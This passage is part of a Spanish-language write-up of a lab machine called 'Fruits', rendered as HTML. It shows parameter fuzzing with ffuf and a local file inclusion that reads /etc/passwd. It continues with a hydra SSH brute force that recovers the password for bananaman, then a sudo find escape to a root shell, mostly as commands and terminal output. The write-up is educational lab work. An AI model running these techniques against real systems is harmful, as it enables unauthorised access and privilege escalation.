+</span></span><span class="line"><span class="cl">.php                    <span class="o">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fruits.php              <span class="o">[</span>Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 0ms<span class="o">]</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>Vemos el archivo <code>fruits.php</code> , vamos a ver que contiene:</p>
+
+<figure>
+  <img
+    srcset="data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoQAAcAAph8J6QAA3AA/vB2AAA="
+        data-srcset="/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_1864x0_resize_q85_h2_lanczos_3.webp 1864w"
+        data-sizes="auto"
+    src="/images/thl/fruits/3_hu17698a9b3cf54821f3b8b45ec7fc6c14_58715_480x0_resize_q85_bgffffff_lanczos_3.jpg"
+    width="1864"
+    height="827"
+    decoding="async"
+    fetchpriority="auto"
+    loading="lazy"
+    alt=""
+    class="lazyload blur-up"
+  >
+</figure>
+<p>Vemos que está en blanco, vamos a hacer fuzzing por parámetros:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u <span class="s2">&#34;http://192.168.231.129/fruits.php?FUZZ=value&#34;</span> -e .php,.html,.js,.txt -fw <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://192.168.231.129/fruits.php?FUZZ<span class="o">=</span>value
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
+</span></span><span class="line"><span class="cl"> :: Extensions       : .php .html .js .txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response words: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>32265/32265<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">83</span> req/sec :: Duration: <span class="o">[</span>0:00:04<span class="o">]</span> :: Errors: <span class="m">0</span> ::</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Vemos que no devuleve ningúno, ya que seguramente esté esperando que apuntemos algo en concreto, vamos a probar con un <code>LFI</code>:</p>
+<h2 id="shell-as-bananaman">Shell as bananaman<a href="#shell-as-bananaman" class="anchor" aria-hidden="true">#</a> </h2>
+<ul>
+<li><code>?FUZZ=/etc/passwd </code></li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u <span class="s2">&#34;http://192.168.231.129/fruits.php?FUZZ=/etc/passwd&#34;</span> -e .php,.html,.js,.txt -fw <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://192.168.231.129/fruits.php?FUZZ<span class="o">=</span>/etc/passwd
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
+</span></span><span class="line"><span class="cl"> :: Extensions       : .php .html .js .txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response words: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">file                    <span class="o">[</span>Status: 200, Size: 1128, Words: 6, Lines: 25, Duration: 0ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>32265/32265<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">76</span> req/sec :: Duration: <span class="o">[</span>0:00:04<span class="o">]</span> :: Errors: <span class="m">0</span> ::</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Vemos que hay una potencial via por <code>LFI</code> , vamos a comprobarlo en la aplicación web:</p>
+
+<figure>
+  <img
+    srcset="data:image/webp;base64,UklGRi4AAABXRUJQVlA4ICIAAAAwAQCdASoQAAoAAph8J6QAA3AA/vA0hRPxM11KIGdeAAAA"
+        data-srcset="/images/thl/fruits/4_huf26a7d6fbb0dbcc2d9853f4aec771b2e_174462_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/fruits/4_huf26a7d6fbb0dbcc2d9853f4aec771b2e_174462_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/fruits/4_huf26a7d6fbb0dbcc2d9853f4aec771b2e_174462_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/fruits/4_huf26a7d6fbb0dbcc2d9853f4aec771b2e_174462_837x0_resize_q85_h2_lanczos_3.webp 837w"
+        data-sizes="auto"
+    src="/images/thl/fruits/4_huf26a7d6fbb0dbcc2d9853f4aec771b2e_174462_480x0_resize_q85_bgffffff_lanczos_3.jpg"
+    width="837"
+    height="543"
+    decoding="async"
+    fetchpriority="auto"
+    loading="lazy"
+    alt=""
+    class="lazyload blur-up"
+  >
+</figure>
+<p>Tenemos un <code>LFI</code> , vemos el usuario <code>bananaman</code> . Vamos a intentar hacer fuerza bruta al servicio de <code>SSH</code> empleando como usuario <code>bananaman</code> :</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.129
+</span></span><span class="line"><span class="cl">Hydra v9.5 <span class="o">(</span>c<span class="o">)</span> <span class="m">2023</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2025-07-15 12:37:33
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://192.168.231.129:22/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 243.00 tries/min, <span class="m">243</span> tries in 00:01h, <span class="m">14344160</span> to <span class="k">do</span> in 983:50h, <span class="m">12</span> active
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.231.129   login: bananaman   password: celtic
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">4</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">4</span> targets did not resolve or could not be connected
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> target did not <span class="nb">complete</span>
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2025-07-15 12:38:37</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Vamos a acceder como el:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>pylon㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/pylon/THL/Fruits/nmap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh bananaman@192.168.231.129
+</span></span><span class="line"><span class="cl">bananaman@192.168.231.129<span class="err">&#39;</span>s password:
+</span></span><span class="line"><span class="cl">Linux Fruits 6.1.0-18-amd64 <span class="c1">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Jul <span class="m">15</span> 14:23:08 <span class="m">2025</span> from 192.168.231.128
+</span></span><span class="line"><span class="cl">bananaman@Fruits:~$</span></span></code></pre></div>
+  </figure>
+</div>
+<h2 id="shell-as-root">Shell as root<a href="#shell-as-root" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Teniendo las credenciales válidas del usuario <code>bananaman</code> , vamos a ver si tiene algún permiso en el <code>sudoers</code>:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bananaman@Fruits:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bananaman on Fruits:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User bananaman may run the following commands on Fruits:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/find</span></span></code></pre></div>
+  </figure>
+</div>
+<p>Podemos usar como cualquier usuario sin necesidad de contraseña el binario <code>find</code> , si buscamos en GTFObins lo encontraremos:</p>
+<p><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
+<p>Vamos a poner lo indicado:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo find . -exec /bin/bash <span class="se">\;</span> -quit</span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@Fruits:/home/bananaman# whoami<span class="p">;</span> hostname -I
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">192.168.231.129</span></span></code></pre></div>
+  </figure>
+</div>
+<p>root! ;)</p>
+<hr>
+<h2 id="reseña">Reseña<a href="#reseña" class="anchor" aria-hidden="true">#</a> </h2>
+
+<figure>
+  <img
+    srcset="data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoQAAMABJh8J6QAA3AA/u/jsAA="
+        data-srcset="/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_1431x0_resize_q85_h2_lanczos_3.webp 1431w"
+        data-sizes="auto"
+    src="/images/thl/fruits/5_hu24a47c0216a8df2fedd563870952d289_58464_480x0_resize_q85_bgffffff_lanczos_3.jpg"
+    width="1431"
+    height="243"
+    decoding="async"
+    fetchpriority="auto"
+    loading="lazy"
+    alt=""
+    class="lazyload blur-up"
+  >
+</figure>
+<hr>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/challenges/intro/bienvenido/" class="stretched-link text-reset text-decoration-none">Bienvenido 👋</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://gethyas.com/">Hyas</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    <script async
+  src="/js/bootstrap.d5ae61923b84be624d1c0d9329b69d550a65fb7ffc68ab373bda5d50574e77ac.js"
+  integrity="sha256-1a5hkjuEvmJNHA2TKbadVQpl&#43;3/8aKs3O9pdUFdOd6w=">
+</script>
+
+
+<script async
+  src="/js/app.c4ebbf02ad927c03cd3621411c58cdf58caccf93240dd80b0561bffdd9c5db48.js"
+  integrity="sha256-xOu/Aq2SfAPNNiFBHFjN9Yysz5MkDdgLBWG//dnF20g=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.a43ad3e9453067320ab808b85ef437fc65518a219cfea8499e744b7b6f0b6924.js"
+  integrity="sha256-pDrT6UUwZzIKuAi4XvQ3/GVRiiGc/qhJnnRLe28LaSQ=">
+</script>
+<script async
+  src="/js/search-modal.543117a85590123cda9e96d1fcbf8bd22fc1a3a3ca3d31a816382f0f10f30a34.js"
+  integrity="sha256-VDEXqFWQEjzanpbR/L&#43;L0i/Bo6PKPTGoFjgvDxDzCjQ=">
+</script>
+
+    
+  </body>
+</html>
